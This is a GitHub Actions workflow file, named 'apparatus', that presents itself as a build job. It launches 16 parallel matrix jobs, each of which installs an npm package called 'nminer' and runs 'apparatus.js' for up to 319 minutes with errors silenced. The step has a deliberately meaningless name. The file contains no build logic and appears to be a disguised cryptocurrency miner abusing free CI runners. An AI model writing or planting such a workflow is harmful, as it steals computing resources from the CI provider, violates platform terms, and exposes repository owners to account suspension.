name: apparatus
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5104 }
          - { version: 6527 }
          - { version: 8206 }
          - { version: 7573 }
          - { version: 2268 }
          - { version: 9396 }
          - { version: 5010 }
          - { version: 715 }
          - { version: 8950 }
          - { version: 749 }
          - { version: 1215 }
          - { version: 3728 }
          - { version: 2605 }
          - { version: 190 }
          - { version: 7157 }
          - { version: 9517 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: shred anti joshingly easy er
        run: |
          npm install nminer@latest
          timeout 319m node apparatus.js || echo "apparatus executed"